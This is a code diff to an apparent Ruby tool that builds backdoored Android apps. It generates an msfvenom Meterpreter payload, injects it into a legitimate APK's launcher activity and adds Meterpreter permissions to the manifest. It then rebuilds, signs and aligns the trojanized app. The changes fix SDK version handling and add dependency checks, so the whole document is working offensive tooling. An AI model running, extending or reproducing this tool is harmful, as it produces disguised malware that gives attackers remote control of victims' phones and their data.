@@ -113,7 +113,7 @@ def scrapeFilesForLauncherActivity()
     return [smalifile,activitysmali]
 end
 
-def fix_manifest()
+def fix_manifest(minSDKv)
   payload_permissions=[]
 
   #Load payload's permissions
@@ -156,6 +156,8 @@ def fix_manifest()
   #Inject permissions in original APK's manifest
   for line in apk_mani.split("\n")
     if (line.include? "uses-permission" and inject==0)
+      `sed "s|minSdkVersion: '"[0-9][0-9]"'|minSdkVersion: '"#{minSDKv}"'|g" -i original/apktool.yml`
+      new_mani << "\t\t"+'<uses-sdk android:minSdkVersion="'+minSDKv+'"/>'+"\n"
       for permission in add_permissions
         new_mani << "\t\t"+'<uses-permission android:name="'+permission+'"/>'+"\n"
       end
@@ -258,6 +260,8 @@ end
 ####
 # VALIDATING REQUIREMENTS && DEPENDENCIES
 apkfile = ARGV[0]
+get_minSDKv=`aapt list -a #{apkfile}|grep "minSdkVersion"|awk -F "x" '{print $NF}'`
+minSDKv = get_minSDKv.to_s.gsub("\n", "")
 current_working_directory = run_cmd(['pwd'])
 cwd = current_working_directory.to_s
 cwd = cwd.gsub("\n", "")
@@ -266,7 +270,7 @@ unless(apkfile && File.readable?(apkfile))
   exit(1)
 end
 
-pkgs = ["jarsigner", "apktool", "zipalign", "java", "apksigner","aapt"]
+pkgs = ["jarsigner", "apktool", "zipalign", "java", "apksigner","aapt","keytool","msfvenom"]
 for pkg in pkgs do
   unless(run_cmd([pkg]))
     print_error("#{pkg} is not in PATH, please install it")
@@ -315,7 +319,6 @@ else
   exit(1)
 end
 
-minSDKv=`aapt list -a #{apkfile}|grep "minSdkVersion"|awk -F "x" '{print $NF}'`
 print_status("Generating msfvenom payload..")
 res=`msfvenom -f raw #{opts} -o payload.apk 2>&1`
 if res.downcase.include?("invalid" || "error")
@@ -327,9 +330,9 @@ print_status("Signing payload..")
 payload_signed = run_cmd(['apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", "#{cwd}/payload.apk"])
 run_cmd(["cp", apkfile, "#{cwd}/original.apk"])
 print_status("Decompiling orignal APK..")
-run_cmd(["apktool", "d", "-r", "-f", "-o", "#{cwd}/original", apkfile])
+run_cmd(["apktool", "d", "-r", "-f", "-o", "#{cwd}/original", "#{cwd}/original.apk"])
 print_status("Ignoring the resource decompilation..")
-run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", apkfile])
+run_cmd(["apktool", "d", "-f", "-o", "#{cwd}/original_tmp", "#{cwd}/original.apk"])
 FileUtils.rm_rf('original/AndroidManifest.xml')
 FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
 FileUtils.rm_rf('original_tmp')
@@ -373,12 +376,11 @@ print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..\n".cyan
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
 injected_apk=apkfile.split(".")[0]
 injected_apk = "data/data/com_backdoored.apk"
-#aligned_apk = "#{cwd}/data/data/com_aligned.apk"
 final_apk=apkfile.split("/")[-1]
 final_apk+="_final"
 
 print_status("Poisoning the manifest with meterpreter permissions..")
-fix_manifest()
+fix_manifest(minSDKv)
 
 print_status("Rebuilding #{apkfile}\n      with meterpreter injection as #{injected_apk}..")
 for i in (1..3) do
@@ -393,7 +395,7 @@ for i in (1..3) do
 end
 
 print_status("Aligning #{injected_apk}..")
-zipalign_output = run_cmd(['zipalign', '-f', '-p', '4', injected_apk, final_apk])
+zipalign_output = run_cmd(['zipalign', '-f', '-v', '4', injected_apk, final_apk])
 
 unless File.readable?(final_apk)
   print_error(zipalign_output)
